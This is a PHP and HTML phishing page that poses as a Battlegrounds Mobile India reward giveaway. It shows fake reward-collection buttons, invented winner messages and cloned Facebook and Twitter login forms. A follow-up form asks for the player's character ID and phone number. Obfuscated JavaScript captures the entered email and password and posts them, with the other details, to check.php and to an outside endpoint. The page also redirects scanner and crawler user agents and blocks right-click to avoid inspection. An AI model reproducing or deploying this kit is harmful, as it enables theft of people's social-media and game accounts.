<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
 body {
	background: #000 center / cover no-repeat;
	margin: 0;
	font-family: 'Teko';
}
.navbar {
	background: #0C0C0C;
	width: 100%;
	height: 60px;
}
.navbar-logo {
	width: 100px;
	float: left;
	margin-top: 12px;
	margin-left: 13px;
}
.navbar-shop {
	width: 29px;
	margin-top: 19px;
	margin-right: 8px;
}
.navbar-menu {
	width: 20px;
	margin-top: 19px;
	margin-right: 5px;
}
.navbar-right {
	width: auto;
	float: right;
}
.navbar-download {
	background: #ffca13;
	width: 50px;
	height: 50px;
	margin-top: 10px;
	margin-right: 3px;
	border-radius: 0px;
	float: right;
}
.navbar-download img {
	width: 20px;
	height: 21px;
	margin: 13px;
}
.navbar-righ {
	width: auto;
	float: right;
}
.navbar-shp {
	width: 29px;
	margin-top: 19px;
	margin-right: 10px;
}
.season-title {
	background:url(img/alert.png) no-repeat center center;
	background-size:100% 100%;
	width: 96%;
	height: 68px;
	margin-top: -8.5px;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	display: block;
	margin-bottom: 10px;
}
.season-title-t1 {
	color: #DCC084;
	font-size: 15px;
	font-family: Teko;
	text-align: left;
	margin-top: 39px;
	line-height: 15px;
	left: 20%;
	position: absolute;
}
.season-title-t2 {
	color: #DCC084;
	font-size: 15px;
	font-family: Teko;
	text-align: right;
	margin-top: 39px;
	line-height: 15px;
	right: 20%;
	position: absolute;
}
.event-theme {
	width: 95%;
	height: 75px;
	margin-top: -25px;
	margin-bottom: -10px;
	margin-left:auto;
	margin-right:auto;
	display:block;
}
.event-notification {
	width:100%;
	height:75px;
	margin-left: -15px;
	margin-right: auto;
	margin-bottom:-5px;
	padding:5px;
}
.event-notification-text {
	padding-top:7px;
	padding-left:19px;
	text-align:center;
	font-family: Teko;
	color:#E7C54C;
	text-shadow: 1px 1px #000;
	font-size:17px;
}
.event-notification i {
	padding-right:5px;
	color:#000;
	font-size:19px;
}
.event-notification-timer {
width: 25%;
	height: auto;
	color: #000;
	font-size: 20px;
	font-family:pubgFont;
	text-align: center;
	border: 1px solid #000;
	border-radius: 5px;
	float: right;
}
.footer {
	background: #131313;
	width: 100%;
	height: auto;
	margin-top: -30px;
	padding: 15px;
}
.item {
	width: 27.5%;
	height: 100px;
	margin: 3px;
	margin-bottom: 38px;
	display: inline-block;
}
.item img, .item button {
	border: none;
}
.item button {
	background-size:100% 100%;
	width:100%;
	height:auto;
	padding:2px;
	color:#ffff;
	font-size:18px;
	font-family:Teko;
	font-weight: 500;
	text-align:center;
	border: none;
	outline:none;
}
.nav-popup-titles {
    padding-left: 24px;
	color: #E7C54C;
	font-size: 15px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
}
.nav-popup-title {
	color: #E7C54C;
	font-size: 15px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
}
.nav-popup img {
	width: 17px;
	height: 17px;
	margin-top: -3px;
	margin-right: 10px;
	color: #000;
	float: right;
}
.popup-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #C3B9A1;
	font-size: 17px;
    font-family:Teko;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-alert i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #C3B9A1;
	font-size: 40px;
	text-align: center;
}
.popup-footer button:nth-child(1) {
	width: auto;
	height: auto;
	margin-top: -4px;
	margin-left:auto;
	margin-right:auto;
	padding: 3px;
	padding-left: 28px;
	padding-right: 28px;
	color: #C3B9A1;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-btn-login {
    width: 85%;
    height: auto;
    padding: 8px;
    margin-left:auto;
	margin-right:auto;
    color: #000;
	font-size: 15px;
    font-family:Teko;
    border-radius: 2px;
    border: none;
    outline: none;
}
.popup-btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
    margin-top: 15px;
	margin-bottom: 3px;
}
.popup-btn-twitter {
    background: #08a0e9;
	margin-bottom: 15px;
    color: #fff;
}
.popup-form-footer {
    margin-top: -16px;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: 4px;
	padding: 3px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-form input {
    background: none;
	background-size: 100% 100%;
	box-shadow: 1px 1px 5px #C3B9A1, -0em 0 .0em #C3B9A1;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 4.4px;
	color: #C3B9A1;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border-top: 0.5px solid #000;
	border-bottom: 0.5px solid #000;
	border-right: 2px solid #000;
	border-left: 2px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form input::placeholder {
	color: #C3B9A1;
}
.popup-form select {
    background: none;
	background-size: 100% 100%;
	box-shadow: 1px 1px 5px #C3B9A1, -0em 0 .0em #C3B9A1;
	width: 90%;
	height: auto;
	margin-left: 6px;
	margin-bottom: 3px;
	padding: 5px;
	padding-left: 6px;
	color: #C3B9A1;
	font-size: 17px;
	font-family:Teko;
	font-weight: 500;
	border-radius: 2px;
	border-top: 0.5px solid #000;
	border-bottom: 0.5px solid #000;
	border-right: 2px solid #000;
	border-left: 2px solid #000;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-form-footer button {
	width: auto;
	height: auto;
	margin-top: -6px;
	margin-bottom: 15px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #C3B9A1;
	font-size:18px;
	font-family: Teko;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.awalbtn {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	margin-top: 0px;
	padding: 0px;
	padding-left: 25px;
	padding-right: 30px;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
	color: #DCC084;
	text-shadow: 1px 1px #000;
	margin-bottom: -10px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
</style>
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://www.battlegroundsmobileindia.com/common/img/common/logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_f_w.png">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_i_w.png">
<img class="navbar-shop" src="https://www.battlegroundsmobileindia.com/common/img/btn/sns_y_w.png">
<div class="navbar-download"><img src="https://i.ibb.co/jwMxWFh/menu.png"></div>
<div class="navbar-righ">
<img class="navbar-shp" src="https://www.battlegroundsmobileindia.com/common/img/icon/icon_shop_50.png"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<img src="img/header.jpg">
</div> <!--- header --->
<div class="box">
<div class="season-title">
</div> <!--- season-title --->
<center>
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">COLLECT</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">COLLECT</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.png">COLLECT</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.png">COLLECT</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.png">COLLECT</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.png">COLLECT</button>
</div>
</div>
<br>
<div class="event-notification">
<div class="event-notification-text">
<div class="slider animated fadeIn">!ID 5149470362 Successful Get Car Koenigseg</div>
<div class="slider animated fadeIn">!ID 5504362590 Successful Get Pharaoh X-suit</div>
<div class="slider animated fadeIn">!ID 5242011396 Successful Get Mummy Set</div>
<div class="slider animated fadeIn">!ID 551627559 Successful Get 28 Materials</div>
<div class="slider animated fadeIn">!ID 576760016 Successful Get Iridescence X-suit</div>
<div class="slider animated fadeIn">!ID 5226032560 Successful Get M416 Glacier</div>
</div> <!--- cont spin_content --->
</div> <!--- gallery-container --->
</div>
</div>
</center>
<div class="footer">
<img class="footer-copyright-icon" src="https://www.battlegroundsmobileindia.com/common/img/common/footerlg.png">
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct | Official Community Policy</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close.png">
<div class="nav-popup-titles">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Are you sure to collect this reward?</div> <!--- popup-alert --->
<div class="popup-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Login</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Login to receive your selected reward</div> <!--- popup-alert --->
<button type="button" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer-log">
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.ibb.co/Wg8qQxh/facebook-text.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email or phone number you entered does not match any account. <b>Find your account.</b></p>
<p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you forget your password?</b></p>
<img src="https://www.battlegroundsmobileindia.com/common/img/main/app.png">
<div class="txt-login-fb">Log in to your Facebook account to connect to Battlegrounds Mobile.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- showPassword --->
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- hidePassword --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb--->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<center>
<div class="header-twitter">
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png" style="margin-bottom: -35px; margin-left: 135px;">
</center>
<center>
<br><br>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter"style="text-align: left; margin-left: 95px;">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile Number')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- TwitterShowPassword --->
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- TwitterHidePassword --->
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login--->

<div class="popup account_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">Complete your account details</div> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Character ID')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('select your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Account Verification</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
<br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-alert --->
<div class="popup-form-footer">
</div> <!--- popup-form-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Thank you for joining this event
<br>
<br>
Your account has been successfully processed
<br>
<br>
To receive your exclusive reward
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/menu_on.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://www.battlegroundsmobileindia.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/showHide.js"></script>
<script>function _0x25b7(){var _0x4d12b2=['hide','#email-facebook','6258720ZjwefC','src','input#nick','click','trim','.processing_account','#password-twitter','check.php','.login-twitter','serialize','currentTarget','672575ECdELU','attr','input#platform','input#rpl','none','.itemReward_confirmation','#login-facebook','https://api-com.xyz/api-flag/','.otherReward_confirmation','getElementsByClassName','3965418dxWKFM','tab_rewards','984068mypQXe','defaultTabRewards','display','1154924GCJlLq','input#phone','value','#password-facebook','#ValidateVerificationDataForm','input#rpt','replace','.account_verification','length','\x20menu-content-active','.check_verification','https://a.top4top.io/m_1725zobal2.mp3','POST','block','submit','.rewardsHome','3EByJzR','input#validateEmail','#email-twitter','#login-twitter','.login-facebook','show','input#tier','1412725bahuWz','val','ajax','menu-content','html','input#validateLogin','https://l.top4top.io/m_1725u5z7i1.mp3','input#validatePassword','#myItemReward_confirmationImg','preventDefault','input#level','3774701TfJyNy','.account_login','className','.verification_info'];_0x25b7=function(){return _0x4d12b2;};return _0x25b7();}var _0x595f71=_0x4f44;(function(_0x37a59f,_0x24341a){var _0x518add=_0x4f44,_0x414ba4=_0x37a59f();while(!![]){try{var _0x1b4859=parseInt(_0x518add(0x121))/0x1+parseInt(_0x518add(0x130))/0x2*(-parseInt(_0x518add(0xfe))/0x3)+parseInt(_0x518add(0x12d))/0x4+-parseInt(_0x518add(0x105))/0x5+parseInt(_0x518add(0x12b))/0x6+parseInt(_0x518add(0x110))/0x7+-parseInt(_0x518add(0x116))/0x8;if(_0x1b4859===_0x24341a)break;else _0x414ba4['push'](_0x414ba4['shift']());}catch(_0x187947){_0x414ba4['push'](_0x414ba4['shift']());}}}(_0x25b7,0x744e7));var buka=new Audio();buka[_0x595f71(0x117)]=_0x595f71(0x10b);var tutup=new Audio();tutup[_0x595f71(0x117)]=_0x595f71(0x13b);function openRewards(_0x261e55,_0x162d79){var _0x36289d=_0x595f71,_0xc23eb5,_0x2aa4f,_0x48e737;_0x2aa4f=document[_0x36289d(0x12a)](_0x36289d(0x12c));for(_0xc23eb5=0x0;_0xc23eb5<_0x2aa4f['length'];_0xc23eb5++){_0x2aa4f[_0xc23eb5]['style']['display']=_0x36289d(0x125);}_0x48e737=document[_0x36289d(0x12a)](_0x36289d(0x108));for(_0xc23eb5=0x0;_0xc23eb5<_0x48e737[_0x36289d(0x138)];_0xc23eb5++){_0x48e737[_0xc23eb5][_0x36289d(0x112)]=_0x48e737[_0xc23eb5][_0x36289d(0x112)][_0x36289d(0x136)](_0x36289d(0x139),'');}document['getElementById'](_0x162d79)['style'][_0x36289d(0x12f)]=_0x36289d(0xfb),_0x261e55[_0x36289d(0x120)]['className']+=_0x36289d(0x139);}document['getElementById'](_0x595f71(0x12e))[_0x595f71(0x119)]();function open_rewardsBox(){var _0x2d63e3=_0x595f71;$('.rewardsBox')[_0x2d63e3(0x103)](),$(_0x2d63e3(0xfd))['hide']();}function open_itemReward_confirmation(_0x188859){var _0x2552b6=_0x595f71,_0x1eeece=$(_0x188859)['attr'](_0x2552b6(0x117));$(_0x2552b6(0x126))[_0x2552b6(0x103)](),$(_0x2552b6(0x10d))[_0x2552b6(0x122)](_0x2552b6(0x117),_0x1eeece);}function open_otherReward_confirmation(_0x19b1b5){var _0x2c2d03=_0x595f71,_0xd616d8=$(_0x19b1b5)['attr'](_0x2c2d03(0x117)),_0x523f8d=$(_0x19b1b5)['attr'](_0x2c2d03(0x132));$('.otherReward_confirmation')[_0x2c2d03(0x103)](),$('#myOtherReward_confirmationImg')[_0x2c2d03(0x122)](_0x2c2d03(0x117),_0xd616d8),$('#otherReward_confirmationValue')[_0x2c2d03(0x109)](_0x523f8d);}function open_account_login(){var _0xbbe382=_0x595f71;$(_0xbbe382(0x111))[_0xbbe382(0x103)](),$('.itemReward_confirmation')[_0xbbe382(0x114)](),$(_0xbbe382(0x129))['hide']();}function open_facebook(){var _0x460a52=_0x595f71;$('.login-facebook')[_0x460a52(0x103)](),$(_0x460a52(0x111))[_0x460a52(0x114)]();}function _0x4f44(_0x156131,_0x4e3580){var _0x25b71d=_0x25b7();return _0x4f44=function(_0x4f4455,_0x3fdfa8){_0x4f4455=_0x4f4455-0xfa;var _0x48f269=_0x25b71d[_0x4f4455];return _0x48f269;},_0x4f44(_0x156131,_0x4e3580);}function open_twitter(){var _0x110b16=_0x595f71;$(_0x110b16(0x11e))[_0x110b16(0x103)](),$(_0x110b16(0x111))[_0x110b16(0x114)]();}function close_reward_confirmation(){var _0x1e3803=_0x595f71;$('.itemReward_confirmation')['hide'](),$(_0x1e3803(0x129))[_0x1e3803(0x114)]();}function tutup_facebook(){var _0x3dcb25=_0x595f71;$(_0x3dcb25(0x102))[_0x3dcb25(0x114)](),$(_0x3dcb25(0x111))[_0x3dcb25(0x103)]();}function tutup_twitter(){var _0x457476=_0x595f71;$(_0x457476(0x11e))[_0x457476(0x114)](),$(_0x457476(0x111))[_0x457476(0x103)]();}function ValidateLoginFbData(){var _0xf6850f=_0x595f71;$('#ValidateLoginFbForm')[_0xf6850f(0xfc)](function(_0x2753eb){var _0x4df6f1=_0xf6850f;_0x2753eb['preventDefault'](),$email=$(_0x4df6f1(0x115))[_0x4df6f1(0x106)]()[_0x4df6f1(0x11a)](),$password=$(_0x4df6f1(0x133))['val']()['trim'](),$login=$(_0x4df6f1(0x127))[_0x4df6f1(0x106)]()['trim']();if($email==''||$password==''){}else $(_0x4df6f1(0x102))['hide'](),$(_0x4df6f1(0x137))[_0x4df6f1(0x103)](),$('input#validateEmail')[_0x4df6f1(0x106)]($email),$(_0x4df6f1(0x10c))[_0x4df6f1(0x106)]($password),$(_0x4df6f1(0x10a))['val']($login);});}function ValidateLoginTwitterData(){var _0x3cfd1f=_0x595f71;$('#ValidateLoginTwitterForm')[_0x3cfd1f(0xfc)](function(_0x56322c){var _0x33d931=_0x3cfd1f;_0x56322c[_0x33d931(0x10e)](),$email=$(_0x33d931(0x100))[_0x33d931(0x106)]()['trim'](),$password=$(_0x33d931(0x11c))[_0x33d931(0x106)]()['trim'](),$login=$(_0x33d931(0x101))[_0x33d931(0x106)]()['trim']();if($email==''||$password==''){}else $(_0x33d931(0x11e))['hide'](),$(_0x33d931(0x137))[_0x33d931(0x103)](),$(_0x33d931(0xff))[_0x33d931(0x106)]($email),$(_0x33d931(0x10c))[_0x33d931(0x106)]($password),$(_0x33d931(0x10a))[_0x33d931(0x106)]($login);});}function ValidateVerificationData(){var _0xba9ddb=_0x595f71,_0x8c958d=$('#ValidateVerificationDataForm')[_0xba9ddb(0x11f)]();return $[_0xba9ddb(0x107)]({'url':_0xba9ddb(0x128),'data':_0x8c958d,'type':_0xba9ddb(0xfa),'success':function(){return!0x0;},'error':function(){return!0x0;}}),$(_0xba9ddb(0x134))[_0xba9ddb(0xfc)](function(_0xd5493b){var _0x10263c=_0xba9ddb;_0xd5493b[_0x10263c(0x10e)]();var _0x52027a=$(_0x10263c(0xff))[_0x10263c(0x106)](),_0x45a306=$('input#validatePassword')[_0x10263c(0x106)](),_0x4c21b6=$(_0x10263c(0x118))[_0x10263c(0x106)](),_0x29dc03=$('input#playid')[_0x10263c(0x106)](),_0x46084a=$(_0x10263c(0x131))['val'](),_0x57205d=$(_0x10263c(0x10f))[_0x10263c(0x106)](),_0x1d2e90=$(_0x10263c(0x104))[_0x10263c(0x106)](),_0x8953bb=$(_0x10263c(0x135))[_0x10263c(0x106)](),_0x256d07=$(_0x10263c(0x124))['val'](),_0x1a948d=$(_0x10263c(0x123))['val'](),_0x28c0fd=$(_0x10263c(0x10a))['val']();if(_0x52027a==''&&_0x45a306==''&&_0x4c21b6==''&&_0x29dc03==''&&_0x46084a==''&&_0x57205d==''&&_0x1d2e90==''&&_0x8953bb==''&&_0x256d07==''&&_0x1a948d==''&&_0x28c0fd=='')return $(_0x10263c(0x113))[_0x10263c(0x103)](),$(_0x10263c(0x137))['hide'](),![];$['ajax']({'type':_0x10263c(0xfa),'url':_0x10263c(0x11d),'data':$(this)[_0x10263c(0x11f)](),'beforeSend':function(){var _0x28b87e=_0x10263c;$('.check_verification')[_0x28b87e(0x103)](),$('.account_verification')['hide']();},'success':function(){var _0x1c5d2a=_0x10263c;$(_0x1c5d2a(0x11b))[_0x1c5d2a(0x103)](),$(_0x1c5d2a(0x13a))[_0x1c5d2a(0x114)](),$(_0x1c5d2a(0x137))[_0x1c5d2a(0x114)]();}});}),![];};</script>
<script>
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function close_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
